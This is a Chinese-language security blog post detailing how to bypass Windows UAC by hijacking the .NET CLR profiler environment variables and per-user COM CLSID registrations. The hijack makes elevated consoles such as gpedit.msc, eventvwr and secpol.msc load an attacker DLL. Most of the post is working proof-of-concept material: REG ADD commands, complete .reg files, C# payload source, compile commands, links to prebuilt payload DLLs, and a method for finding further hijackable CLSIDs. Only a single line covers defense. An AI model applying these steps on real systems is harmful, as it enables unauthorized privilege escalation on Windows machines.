---
layout: post
title: Use CLR to bypass UAC
---


## 0x00 前言
---

在之前的文章[《Use CLR to maintain persistence》](https://3gstudent.github.io/3gstudent.github.io/Use-CLR-to-maintain-persistence/)介绍了通过CLR劫持.Net程序的后门，特点是无需管理员权限，并能够劫持所有.Net程序。那么，如果劫持了高权限的.Net程序，就能够绕过UAC，比如gpedit.msc

最近我在clem@clavoillotte的博客上也看到了相同的利用思路，并且，他的博客里有更多值得学习的地方。于是，我对他博客介绍的内容进行了整理，结合自己的经验，适当作补充，分享给大家。

clem@clavoillotte的博客地址：

https://offsec.provadys.com/UAC-bypass-dotnet.html

## 0x01 简介
---

本文将要介绍以下内容：

- 使用CLR绕过UAC的方法
- 劫持系统CLSID绕过UAC的方法

## 0x02 使用CLR绕过UAC
---

我在[《Use CLR to maintain persistence》](https://3gstudent.github.io/3gstudent.github.io/Use-CLR-to-maintain-persistence/)一文中使用了wmic修改环境变量，代码如下：

```
wmic ENVIRONMENT create name="COR_ENABLE_PROFILING",username="%username%",VariableValue="1"
wmic ENVIRONMENT create name="COR_PROFILER",username="%username%",VariableValue="{11111111-1111-1111-1111-111111111111}"
```

在[《Use Logon Scripts to maintain persistence》](https://3gstudent.github.io/3gstudent.github.io/Use-Logon-Scripts-to-maintain-persistence/)补充了使用powershell修改环境变量的方法，代码如下：

```
New-ItemProperty "HKCU:\Environment\" COR_ENABLE_PROFILING -value "1" -propertyType string | Out-Null
New-ItemProperty "HKCU:\Environment\" COR_PROFILER -value "{11111111-1111-1111-1111-111111111111}" -propertyType string | Out-Null
```

clem@clavoillotte的方法是直接通过reg add，代码如下：

```
REG ADD "HKCU\Software\Classes\CLSID\{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}\InprocServer32" /ve /t REG_EXPAND_SZ /d "C:\Temp\test.dll" /f
REG ADD "HKCU\Environment" /v "COR_PROFILER" /t REG_SZ /d "{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}" /f
```

clem@clavoillotte的POC:

```
REG ADD "HKCU\Software\Classes\CLSID\{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}\InprocServer32" /ve /t REG_EXPAND_SZ /d "C:\Temp\test.dll" /f
REG ADD "HKCU\Environment" /v "COR_PROFILER" /t REG_SZ /d "{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}" /f
REG ADD "HKCU\Environment" /v "COR_ENABLE_PROFILING" /t REG_SZ /d "1" /f
REG ADD "HKCU\Environment" /v "COR_PROFILER_PATH" /t REG_SZ /d "C:\Temp\test.dll" /f
mmc gpedit.msc
```

个人认为不需要指定环境变量COR_PROFILER_PATH，经过精简后的POC如下：

```
REG ADD "HKCU\Software\Classes\CLSID\{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}\InprocServer32" /ve /t REG_EXPAND_SZ /d "C:\test\calc.dll" /f
REG ADD "HKCU\Environment" /v "COR_PROFILER" /t REG_SZ /d "{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}" /f
REG ADD "HKCU\Environment" /v "COR_ENABLE_PROFILING" /t REG_SZ /d "1" /f
mmc gpedit.msc
```

测试dll依旧是通过c++编写的dll标准模板，下载地址：

https://raw.githubusercontent.com/3gstudent/test/master/calc.dll

会正常启动gpedit.msc，同时弹出计算器，权限为high

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-19/3-1.png)

如果想只启动计算器，不执行gpedit.msc，在启动代码`WinExec("calc.exe",SW_SHOWNORMAL);`后添加`ExitProcess(0);`就好

编译好的dll已上传，下载地址如下：

https://raw.githubusercontent.com/3gstudent/test/master/calcexit.dll

测试如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-19/3-2.png)

计算器权限为high，成功绕过UAC


## 0x03 劫持系统CLSID绕过UAC的方法
---

clem@clavoillotte在博客中分享了如何劫持系统CLSID实现UAC绕过，所以接下来对其逐个测试，并标记需要注意的地方


### 1、{B29D466A-857D-35BA-8712-A758861BFEA1}

注册表文件如下：

```
Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Classes\CLSID\{B29D466A-857D-35BA-8712-A758861BFEA1}]
@="Microsoft.GroupPolicy.AdmTmplEditor.GPMAdmTmplEditorManager"

[HKEY_CURRENT_USER\Software\Classes\CLSID\{B29D466A-857D-35BA-8712-A758861BFEA1}\Implemented Categories]

[HKEY_CURRENT_USER\Software\Classes\CLSID\{B29D466A-857D-35BA-8712-A758861BFEA1}\Implemented Categories\{62C8FE65-4EBB-45E7-B440-6E39B2CDBF29}]

[HKEY_CURRENT_USER\Software\Classes\CLSID\{B29D466A-857D-35BA-8712-A758861BFEA1}\InprocServer32]
@="C:\\Windows\\System32\\mscoree.dll"
"Assembly"="TestDotNet, Version=0.0.0.0, Culture=neutral"
"Class"="TestDotNet.Class1"
"RuntimeVersion"="v4.0.30319"
"ThreadingModel"="Both"
"CodeBase"="file://C://Temp//test_managed.dll"

[HKEY_CURRENT_USER\Software\Classes\CLSID\{B29D466A-857D-35BA-8712-A758861BFEA1}\InprocServer32\10.0.0.0]
"Assembly"="TestDotNet, Version=0.0.0.0, Culture=neutral"
"Class"="TestDotNet.Class1"
"RuntimeVersion"="v4.0.30319"
"CodeBase"="file://C://Temp//test_managed.dll"

[HKEY_CURRENT_USER\Software\Classes\CLSID\{B29D466A-857D-35BA-8712-A758861BFEA1}\ProgId]
@="Microsoft.GroupPolicy.AdmTmplEditor.GPMAdmTmplEditorManager"
```

**注：**

注册表项中的`@="Microsoft.GroupPolicy.AdmTmplEditor.GPMAdmTmplEditorManager"`表明，执行gpedit.msc时会调用该CLSID

生成test_managed.dll的c#代码如下：

```
using System;
using System.Diagnostics;

namespace TestDotNet
{
   public class Class1
   {
      static Class1()
      { 
         Process.Start("calc.exe");
         Environment.Exit(0);
      }
   }
}
```

保存为`TestDotNet.cs`，编译成dll

使用csc.exe编译生成dll：

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:library TestDotNet.cs
```

**注：**

使用.Net 4.0目录下的csc.exe

将生成的TestDotNet.dll重命名为test_managed.dll，成功绕过UAC，测试如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-19/4-4.png)

**补充关于c#编译文件的一个技巧：**

使用Visual Studio编译c#程序，如果项目名称同程序集名称(即命名空间namespace)不对应（结合本文，代码中程序集名称为TestDotNet，而新建的项目名却是Class1），需要重新指定程序集名称，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-19/4-2.png)

同样，使用csc.exe编译生成文件也存在这个问题

例如将源代码保存为a.cs，那么在输出的时候必须加/out参数指定输出文件为TestDotNet.dll，这样程序集名称也默认为TestDotNet（同源代码对应），具体参数如下：

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:library /out:TestDotNet.dll a.cs
```

否则，dll虽然能够被加载，但无法执行，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-19/4-3.png)

### 2、{D5AB5662-131D-453D-88C8-9BBA87502ADE}

注册表文件如下：

```
Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Classes\CLSID\{D5AB5662-131D-453D-88C8-9BBA87502ADE}]
@="Microsoft.ManagementConsole.Advanced.FrameworkSnapInFactory"

[HKEY_CURRENT_USER\Software\Classes\CLSID\{D5AB5662-131D-453D-88C8-9BBA87502ADE}\Implemented Categories]

[HKEY_CURRENT_USER\Software\Classes\CLSID\{D5AB5662-131D-453D-88C8-9BBA87502ADE}\Implemented Categories\{62C8FE65-4EBB-45e7-B440-6E39B2CDBF29}]

[HKEY_CURRENT_USER\Software\Classes\CLSID\{D5AB5662-131D-453D-88C8-9BBA87502ADE}\InprocServer32]
@="C:\\Windows\\System32\\mscoree.dll"
"Assembly"="TestDotNet, Version=0.0.0.0, Culture=neutral"
"Class"="TestDotNet.Class1"
"RuntimeVersion"="v2.0.50727"
"ThreadingModel"="Both"
"CodeBase"="file://C://Temp//test_managed.dll"

[HKEY_CURRENT_USER\Software\Classes\CLSID\{D5AB5662-131D-453D-88C8-9BBA87502ADE}\InprocServer32\3.0.0.0]
"Assembly"="TestDotNet, Version=0.0.0.0, Culture=neutral"
"Class"="TestDotNet.Class1"
"RuntimeVersion"="v2.0.50727"
"CodeBase"="file://C://Temp//test_managed.dll"
```

**注：**

注册表项中的`@="Microsoft.ManagementConsole.Advanced.FrameworkSnapInFactory"`，以下命令执行时会调用该CLSID：

- compmgmt.msc
- eventvwr.msc
- secpol.msc
- taskschd.msc

使用csc.exe编译dll：

```
C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /t:library TestDotNet.cs
```

**注：**

dll要使用.net 2.0编译


### 3、{0A29FF9E-7F9C-4437-8B11-F424491E3931}

注册表文件如下：

```
Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}]
@="NDP SymBinder"

[HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InprocServer32]
@="C:\\Windows\\System32\\mscoree.dll"
"ThreadingModel"="Both"

[HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InprocServer32\4.0.30319]
@="4.0.30319"
"ImplementedInThisVersion"=""

[HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\ProgID]
@="CorSymBinder_SxS"

[HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\Server]
@="C:\\Temp\\test_unmanaged.dll"
```

测试系统为Win7和Win10，未成功，所以我对该脚本作了修改，修改后的文件如下：

```
Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}]
@="NDP SymBinder"

[HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InprocServer32]
@="C:\\Temp\\test_unmanaged.dll"
"ThreadingModel"="Both"
```

此处的test_unmanaged.dll同1和2的不同，这里需要一个标准dll，实现dll劫持，dll下载地址;

https://raw.githubusercontent.com/3gstudent/test/master/calcexit.dll

执行以下代码均能触发dll劫持，实现UAC绕过：

```
C:\Windows\System32\eventvwr.exe
```

or

```
C:\Windows\System32\mmc.exe CompMgmt.msc
```

**注：**

该利用方法b33f@FuzzySecurity在DefCon25也介绍过，详情可见如下链接：

https://raw.githubusercontent.com/FuzzySecurity/DefCon25/master/Lab-Writeup.txt

### 4、{CB2F6723-AB3A-11D2-9C40-00C04FA30A3E}

注册表文件如下：

```
Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Classes\CLSID\{CB2F6723-AB3A-11D2-9C40-00C04FA30A3E}]
@="Microsoft Common Language Runtime Meta Data"

[HKEY_CURRENT_USER\Software\Classes\CLSID\{CB2F6723-AB3A-11D2-9C40-00C04FA30A3E}\InprocServer32]
@="C:\\Windows\\System32\\mscoree.dll"
"ThreadingModel"="Both"

[HKEY_CURRENT_USER\Software\Classes\CLSID\{CB2F6723-AB3A-11D2-9C40-00C04FA30A3E}\InprocServer32\4.0.30319]
@="4.0.30319"
"ImplementedInThisVersion"=""

[HKEY_CURRENT_USER\Software\Classes\CLSID\{CB2F6723-AB3A-11D2-9C40-00C04FA30A3E}\ProgID]
@="CLRMetaData.CorRuntimeHost.2"

[HKEY_CURRENT_USER\Software\Classes\CLSID\{CB2F6723-AB3A-11D2-9C40-00C04FA30A3E}\Server]
@="..\\..\\..\\..\\Temp\\test_unmanaged.dll"
```

此处的test_unmanaged.dll同1和2的不同，这里需要一个标准dll，实现dll劫持，dll下载地址;

https://raw.githubusercontent.com/3gstudent/test/master/calcexit.dll

执行secpol.msc触发dll劫持，测试如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-19/5-2.png)

## 0x04 补充

使用Procmon记录gpedit.msc的启动过程，寻找可被利用的系统CLSID，寻找特征如下：

打开注册表键值`HKCU:\Software\Classes\CLSID\{****}\InprocServer32`，返回`NAME NOT FOUND`

打开注册表键值`HKCR:\CLSID\{****}\InprocServer32`，返回`SUCCESS`

如下图，标记的几个CLSID符合要求

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-19/4-1.png)

在测试系统Win7 x86下共找到如下符合要求的CLSID：

- {8FC0B734-A0E1-11D1-A7D3-0000F87571E3}
- {B708457E-DB61-4C55-A92F-0D4B5E9B1224}
- {871C5380-42A0-1069-A2EA-08002B30309D}
- {D02B1F72-3407-48ae-BA88-E8213C6761F1}
- {B29D466A-857D-35BA-8712-A758861BFEA1}
- {D02B1F73-3407-48AE-BA88-E8213C6761F1}
- {B0395DA5-6A15-4E44-9F36-9A9DC7A2F341}
- {ADE6444B-C91F-4E37-92A4-5BB430A33340}

## 0x05 防御
---

监控注册表`HKEY_CURRENT_USER\Software\Classes\CLSID\`下键值的创建和修改

## 0x06 小结
---

微软不把UAC绕过作为漏洞，站在他们的角度可以理解。但在渗透测试中，常常会碰到需要绕过UAC的情况，某些UAC绕过方法往往还能作更多利用。站在防御的角度，提醒防御方对UAC绕过方法保持关注。

---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)






